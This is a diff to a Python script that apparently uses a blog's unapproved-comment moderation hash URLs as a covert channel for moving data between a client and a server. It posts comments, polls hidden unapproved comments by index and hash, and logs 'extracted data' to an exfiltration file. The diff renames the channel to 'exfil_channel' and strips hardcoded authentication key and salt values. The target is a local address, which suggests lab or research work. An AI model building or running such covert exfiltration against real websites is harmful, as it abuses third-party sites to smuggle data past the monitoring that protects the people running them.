@@ -8,10 +8,8 @@ import datetime
 
 random.seed(int(datetime.datetime.now().timestamp()) + int(sys.argv[1]))
 
-AUTH_KEY = "0c008b2f27fbaf5e9acaaa08bf251fc98c6d38a1"
-AUTH_SALT = "ea30c9849bfd208c9890cbf7bb56f59a20b52c4f"
 target_blog = "http://127.0.0.3/"
-sync_channel = "2021/08/06/hello-world/"
+exfil_channel = "2021/08/06/hello-world/"
 
 server_time_slot = "2:22"
 client_time_slot = "1:11"
@@ -59,7 +57,7 @@ def get_current_unapproved_index():
 
     random_string = generate_random_string(10)
     comment_to_send = random_string + ": get_current_unapproved_index (" + str(comment_index) + ") "
-    response = submit_comment(comment_to_send)
+    response = submit_comment(target_blog + exfil_channel, comment_to_send)
     comment_index += 1
 
     response_splitted = response.split("\n")
@@ -127,7 +125,7 @@ while(loop_counter > 0):
             if current_unapproved_index in processed_unapproved_indexes:
                 continue
             
-            url = target_blog + sync_channel + "?unapproved=" + str(current_unapproved_index) + "&moderation-hash=" + current_hash + "&url=" + str(current_unapproved_index)
+            url = target_blog + exfil_channel + "?unapproved=" + str(current_unapproved_index) + "&moderation-hash=" + current_hash + "&url=" + str(current_unapproved_index)
             print("[INFO] Checking URL: " + url);
 
             response_html = fetch_comments_page(url)
@@ -140,7 +138,7 @@ while(loop_counter > 0):
                     to_write = str(datetime.datetime.utcnow()) + ": "
                     to_write += "Extracted data with timeslot of " + client_time_slot + ": " + str(elem.string).strip() + "\n"
                     print("[INFO] " + to_write);
-                    f = open("exfiltrated.txt", "a")
+                    f = open("../output/exfiltrated.txt", "a")
                     f.write(to_write)
                     f.close()
 
